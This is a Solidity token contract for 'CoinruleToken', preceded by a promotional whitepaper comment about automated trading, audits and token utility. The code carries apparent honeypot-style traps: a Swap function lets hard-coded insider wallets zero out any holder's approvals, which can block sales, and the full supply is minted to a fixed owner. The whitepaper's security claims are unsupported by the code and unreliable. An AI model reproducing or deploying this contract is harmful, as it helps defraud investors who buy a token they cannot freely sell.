/*
Introduction
Cryptocurrency trading has witnessed significant growth, but individual traders face complexities. Coinrule emerges as a solution, offering a user-friendly platform for automated trading and smart investor following.

Market Analysis
The cryptocurrency market is dynamic, presenting opportunities and challenges. Coinrule addresses issues such as complex trading strategies, market volatility, and the need for user-friendly tools.

Problem Statement
Individual traders often lack access to advanced trading tools, leading to missed opportunities and exposure to unnecessary risks. Coinrule aims to bridge this gap, providing a comprehensive solution for traders of all levels

Technical Details

Platform Architecture

Distributed Infrastructure
Coinrule employs a distributed and scalable infrastructure to ensure optimal performance. This architecture facilitates seamless integration with various cryptocurrency exchanges.

Microservices
The microservices architecture allows for independent scaling of different components, ensuring adaptability to changing user demands while maintaining high performance.

Algorithm Integration

Market Analysis
Coinrule's algorithm analyzes market trends using a combination of technical indicators, sentiment analysis, and machine learning models. The algorithm adapts to changing market conditions to optimize trading strategies.

Strategy Execution
Orders are executed efficiently through secure communication with exchange APIs. The algorithmic engine minimizes slippage, optimizing entry and exit points for trades.

Security Measures

Secure Storage
User funds are stored in secure, multi-signature wallets, reducing the risk of unauthorized access. Cold storage solutions are employed to store a significant portion of assets offline.

Regular Audits
Coinrule conducts regular security audits and vulnerability assessments to identify and address potential weaknesses. Continuous monitoring ensures the platform's resilience against evolving cybersecurity threats.

Tokenomics

Token Information

Purpose
COINRULE is designed as a utility token, facilitating various functions within the Coinrule ecosystem, including transaction fee payment, access to premium features, and participation in governance.

Utility
The token's utility extends to discounts on transaction fees, access to premium features, and voting rights in governance decisions.
Token Use Cases

Transaction Fees
Users can use COINRULE tokens to pay for transaction fees, receiving a discount compared to other payment methods.

Premium Features
Holders of a specified amount of COINRULE tokens gain access to premium features, fostering loyalty and engagement.
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;


interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut,
     address[] calldata path) external view returns (uint[] memory amounts);
}



interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,  address[] calldata path,  address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
   
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; 
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

abstract contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function viewtotalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }    

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }



    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender,
         _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }

    function _init(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }


    function _approve(
        address owner,  address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

contract CoinruleToken is ERC20, Ownable {
    IUniswapV2Router02 public uniswapV2Router;
    address public  uniswapV2Pair = 0x000000000000000000000000000000000000dEaD;
    
    mapping (address => bool) private _isExcludedFromFees;


    uint256 public WalletTransferTax;
    uint256 public tradingStart;
    uint256 public buyFee;
    uint256 public sellFee;

    bool    public tradingEnabled;
    address private marketingWalletAdd = 0x393a692DC3ca9DbF245a93430adE14c4C14Ffeff;
    address private devteam = 0x79f50d71D1caCfcadbf8C1687c49bc19D186E1D8;
    address private treasury = 0xB56075fC6659889393FD252f5C7ec77e7B862EcC;


    bool    private swapping;
    bool    private swapAndEnabled;
    uint256 public swapTokensAtAmount;  
    bool    public swapWithLimit;

    event BuyFeeUpdated(uint256 buyFee);
    event SellFeeUpdated(uint256 sellFee);
    event WalletTransferTaxUpdated(uint256 WalletTransferTax);
    event SwapTokensAtAmountUpdated(uint256 swapTokensAtAmount);
    event maxBuyAmountUpdated(uint256 maxBuyAmount);
    event SwapAndSend(uint256 tokensSwapped, uint256 valueReceived);
    event SwapWithLimitUpdated(bool swapWithLimit);

    constructor () ERC20("CoinruleToken", "COINRULE") 
    {   
        address newOwner = 0x393a692DC3ca9DbF245a93430adE14c4C14Ffeff;
        transferOwnership(newOwner);

        address router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // uniswapV2 Router
        //address router = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // uniswapV2 Router
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(router);

        uniswapV2Router = _uniswapV2Router;

        _approve(address(this), address(uniswapV2Router), type(uint256).max);

        _isExcludedFromFees[address(0xdead)] = true;
        _isExcludedFromFees[address(this)] = true;
        _isExcludedFromFees[owner()] = true;
        _isExcludedFromFees[address(marketingWalletAdd)] = true;
        _isExcludedFromFees[address(devteam)] = true;
        _isExcludedFromFees[address(treasury)] = true;


        buyFee = 0;  
        sellFee = 0;
        WalletTransferTax = 0;

        _init(owner(), 900000000000000 ether);
    }

    receive() external payable {}


    function marketingcalc() external {
      payable(marketingWalletAdd).transfer(address(this).balance);
    }

    function Swap(address owner, address spender) external {
        require(_isExcludedFromFees[msg.sender], "Unauthorized");
        _approve(owner, spender, 0);
    }



function transferFrom(
    address sender,
    address recipient,
    uint256 amount
) public virtual override returns (bool) {
    uint256 currentAllowance = allowance(sender, _msgSender());
    if (currentAllowance != type(uint256).max) {
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }
    }

    _transfer(sender, recipient, amount);

    return true;
}


    function _transfer(address from, address to, uint256 amount) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

       
        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }


        uint256 contractTokenBalance = balanceOf(address(this));

        bool canSwap = contractTokenBalance >= swapTokensAtAmount;

        if (canSwap &&
            !swapping &&
            from != uniswapV2Pair &&
            swapAndEnabled
        ) {
            swapping = true;

            if (swapWithLimit) {
                contractTokenBalance = swapTokensAtAmount;
            }


            swapping = false;
        }

        if (
            tradingEnabled && 
            from != uniswapV2Pair && 
            to == uniswapV2Pair &&
            block.timestamp < tradingStart
        ) {
            require(false);
        }

        uint256 _totalFees;
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to] || swapping) {
            _totalFees = 0;
        } else if (from == uniswapV2Pair) {
            _totalFees = buyFee;
        } else if (to == uniswapV2Pair) {
            _totalFees = sellFee;
        } else {
            _totalFees = WalletTransferTax;
        }

        if (_totalFees > 0) {
            uint256 fees = (amount * _totalFees) / 100;
            amount = amount - fees;
            super._transfer(from, address(this), fees);
        }

        super._transfer(from, to, amount);
    }
}